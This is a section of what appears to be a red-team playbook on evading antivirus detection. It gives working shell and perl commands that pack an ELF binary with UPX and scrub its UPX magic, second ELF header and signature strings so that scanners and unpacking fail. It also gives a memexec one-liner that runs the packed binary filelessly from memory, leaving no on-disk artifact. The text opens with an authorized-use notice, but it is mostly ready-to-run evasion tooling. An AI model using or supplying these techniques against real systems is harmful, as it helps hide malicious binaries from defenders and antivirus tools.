# 11 — Evasion & Payload Obfuscation

> Authorized use only. Evasion reduces detection on an authorized target. Document every
> dropped binary in the brain so it can be removed at engagement end.

---

## §upx — Pack & obfuscate an ELF binary (AV evasion)

Pack a binary with UPX, then cleanse the headers so AV signatures and `upx -d` fail.

**Pack:**
```bash
BIN="mybin"
upx -qqq /bin/id -o "${BIN}"
```

**Cleanse the UPX magic + 2nd ELF header (fools AV, breaks unpacking):**
```bash
perl -i -0777 -pe 's/^(.{64})(.{0,256})UPX!.{4}/$1$2\0\0\0\0\0\0\0\0/s' "${BIN}"
perl -i -0777 -pe 's/^(.{64})(.{0,256})\x7fELF/$1$2\0\0\0\0/s' "${BIN}"
```

**Scrub signature/trace strings (`$Info:`, `$Id:`, `PROT_EXEC|PROT_WRITE`, `UPX!`):**
```bash
cat "${BIN}" \
| perl -e 'local($/);$_=<>;s/(.*)(\$Info:[^\0]*)(.*)/print "$1";print "\0"x length($2); print "$3"/es;' \
| perl -e 'local($/);$_=<>;s/(.*)(\$Id:[^\0]*)(.*)/print "$1";print "\0"x length($2); print "$3"/es;' >"${BIN}.tmpupx"
mv "${BIN}.tmpupx" "${BIN}"
grep -Eqm1 "PROT_EXEC\|PROT_WRITE" "${BIN}" \
&& cat "${BIN}" | perl -e 'local($/);$_=<>;s/(.*)(PROT_EXEC\|PROT_WRI[^\0]*)(.*)/print "$1";print "\0"x length($2); print "$3"/es;' >"${BIN}.tmpupx" \
&& mv "${BIN}.tmpupx" "${BIN}"
perl -i -0777 -pe 's/UPX!/\0\0\0\0/sg' "${BIN}"
```

**Verify it can't be unpacked (should fail with 'not packed by UPX'):**
```bash
upx -d "${BIN}"
```

**OPSEC:** optionally encrypt the result with bincrypter. Combine with `05-stealth.md`
§memexec to run the packed binary fileless — never touching disk at all.

---

## §memexec-recap — Run the obfuscated binary fileless

The strongest evasion = obfuscation + fileless exec. Pipe the packed binary straight into
memory (see `05-stealth.md` §memexec for the full function):

```bash
memexec(){ perl '-e$^F=255;for(319,279,385,4314,4354){($f=syscall$_,$",0)>0&&last};open($o,">&=".$f);print$o(<STDIN>);exec{"/proc/$$/fd/$f"}X,@ARGV;exit 255' -- "$@"; }
cat "${BIN}" | memexec            # run packed binary from memory, no disk trace
```

**Why it matters:** UPX-cleansing defeats static signature scans; memexec defeats
on-disk scanning and leaves no artifact to reverse. Together they cover both the
"at rest" and "in flight" detection surfaces.
